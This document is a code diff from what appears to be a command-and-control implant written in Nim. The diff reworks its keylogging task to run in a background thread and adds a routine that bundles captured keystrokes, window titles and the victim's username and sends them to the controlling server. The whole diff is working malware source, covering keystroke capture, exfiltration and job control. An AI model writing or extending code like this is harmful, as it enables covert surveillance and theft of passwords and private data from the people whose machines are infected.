@@ -7,10 +7,12 @@ import http
 from sequtils import keepIf, anyIt
 import strformat
 import strutils
-from tables import pairs
+from tables import pairs, Table, len
 import times
 import task
 from os import fileExists
+import locks
+#import os
 from task import Job
 import ../commands/cat
 import ../commands/cd
@@ -33,6 +35,13 @@ import ../commands/shinject
 import ../commands/upload
 import ../commands/unsetenv
 
+var 
+   workerThread: Thread[void]
+   tLock*: Lock
+   kgFlag: bool
+
+var windowsToKey* : Table[string, string]
+
 proc checkDate*(kdate: string) : bool =
    if cmp("yyyy-mm-dd", kdate) == 0:
       result = false
@@ -44,10 +53,47 @@ proc checkDate*(kdate: string) : bool =
       else:
          result = false
 
+proc parseAndShipKgResults(holderTuple: tuple[config: Config, job: Job], spawnResult: Table[string, string]): Future[bool] {.async.} = 
+   let curConfig = holderTuple.config
+   let jtemp = holderTuple.job
+   let user = await keylog.getUser()
+   debugMsg("Obtained spawnResult: ", $spawnResult)
+   let respJson = %*{"action" : "post_response", "responses": []}
+   for window, keystrokes in spawnResult.pairs:
+      let shipJson = %*
+         {
+            "task_id": jtemp.TaskId,
+            "user": user,
+            "window_title": window,
+            "keystrokes": keystrokes
+         }
+      respJson["responses"].add(shipJson)
+   let resp = when defined(AESPSK): await Fetch(curConfig, $(respJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(respJson)), true)
+   #debugMsg("resp for keystrokes for window: ", respJson, $(resp))
+   # messageFlowVar = spawn keylog.execute()
+
+proc keylogHandler() {.gcsafe, thread} = 
+   # var spawnResult = keylog.execute()
+   while true: 
+      debugMsg("Inside while true loop spawning keylog task")
+      acquire(tLock)
+      windowsToKey = keylog.execute()
+      # after obtain spawnResult set flag
+      debugMsg("Spawn result has been obtained")
+      if len(windowsToKey) > 0:
+         debugMsg("Setting length of spawnResult over")
+         kgFlag = true
+         debugMsg("kgflag is true")
+      release(tLock)
+      # TODO determine if should move getUser outside while loop 
+      # const user = await keylog.getUser() 
+     #debugMsg("Last line of while loop just spawned keylog again")
+
 proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): Future[tuple[jobs: seq[Job], newConfig: Config]] {.async.} = 
    # Where the magic happens
    # Iterate through both tasks and runningJobs
    # The only running jobs are Upload and Download for now....
+   var realRunningJobs = runningJobs
    var jobSeq: seq[Job]
    var newConfig = curConfig
    for task in tasks:
@@ -56,6 +102,7 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
       var jtemp: Job     
       let parsedJsonTask =  if task.parameters.contains("{"): parseJson(task.parameters) else: %*{}
       jtemp.TaskId = task.id
+      jtemp.Command = task.action
       # TODO convert thread logic to async procs
       try:
          case task.action.toLower():
@@ -114,43 +161,50 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                # Keep all jobs where job id is not equal to passed in id to remove
                var curParams = task.parameters
                debugMsg("jobseq before removing job with id of: ", curParams, $jobSeq)
-               keepIf(jobSeq, proc(x: Job): bool = x.TaskId != curParams)
+               # Special check for keylogging task as need to stop thread
+               for job in realRunningJobs:
+                  debugMsg("inside jobkill within for loop in realrunning jobs and current job is: ", $job)
+                  if job.TaskId == curParams and job.Command == "keylog":
+                     debugMsg("Killing keylog job")
+                     workerThread.joinThread()
+                     deinitLock(tLock)    
+                     debugMsg("Thread has been joined and lock has been deinitiliazed")  
+               
+               # TODO remove keepIf and do jobseq.remove change from O(N)^2 to O(N)
+               keepIf(realRunningJobs, proc(x: Job): bool = x.TaskId != curParams)
                debugMsg("jobseq after: ", $jobSeq)
                jtemp.Success = true
             of "jobs":
-               for job in runningJobs:
+               for job in realRunningJobs:
                   temp = temp & $(job) & "\n"
                jtemp.Success = true
             of "keylog":
-               var curId = task.id
+               if (jtemp in realRunningJobs) == false:
+                  debugMsg("Jtemp not in jobSeq adding it ")
+                  jobSeq.add(jtemp)
+                  initLock(tLock)
+
+               if jobSeq.anyIt(it.Taskid == jtemp.TaskId):
+                  createThread(workerThread, keylogHandler)
+                  debugMsg("Starting thread for keylog")
+
+              #else:
+               #   workerThread.joinThread()
+               #  deinitLock(tLock)
                # Continously ship keystrokes every 30 seconds
                # Check if keylog is still within taskid if not discard
-               jobSeq.add(jtemp)
-               debugMsg("Inside keylog the current jobSeq: ", $jobSeq)
-               while true:
-                  if jobSeq.anyIt(it.Taskid == jtemp.TaskId):
-                     debugMsg("Calling keylog")
-                     let spawnResult = await keylog.execute()
-                     debugMsg("Obtained spawnResult")
-                     let user = await keylog.getUser()
-                     let respJson = %*{"action" : "post_response", "responses": []}
-                     for window, keystrokes in spawnResult.pairs:
-                        let shipJson = %*
-                           {
-                              "task_id": jtemp.TaskId,
-                              "user": user,
-                              "window_title": window,
-                              "keystrokes": keystrokes
-                           }
-                        respJson["responses"].add(shipJson)
-                     let resp = when defined(AESPSK): await Fetch(curConfig, $(respJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(respJson)), true)
-                     debugMsg("resp for keystrokes for window: ", respJson, $(resp))
-                  else:
-                     debugMsg("breaking")
-                     break
+               #jobSeq.add(jtemp)
+               #debugMsg("Inside keylog the current jobSeq: ", $jobSeq)
+              #  var messageFlowVar = spawn keylog.execute()
+               #debugMsg("Spawned keylog")
+               
+                        # await sleepAsync(1000) commented out for now
+                  #else:
+                  #   debugMsg("breaking")
+                  #   break
                   # Sleep for 1 second
-                  debugMsg("sleeping")
-                  await sleepAsync(1000) 
+                  #debugMsg("sleeping")
+                  # await sleepAsync(1000) 
                # Add to running jobs to continue keylogging
                # jobSeq.add(jtemp)
                # spawnResult = Table[Windows, keystrokes]
@@ -254,8 +308,8 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
       jobSeq.add(jtemp)
 
    # Identation matters or you can spend hours debugging...
-   debugMsg("inside joblauncher and runningJobs: ", $(runningJobs))
-   for job in runningJobs:
+   debugMsg("inside joblauncher and realRunningJobs: ", $(realRunningJobs))
+   for job in realRunningJobs:
       debugMsg("Inside running jobs for loop here is a running job: ", $(job))
       # TODO apply DRY to upload and download compact into two distinct methods!
       var copyJob = job
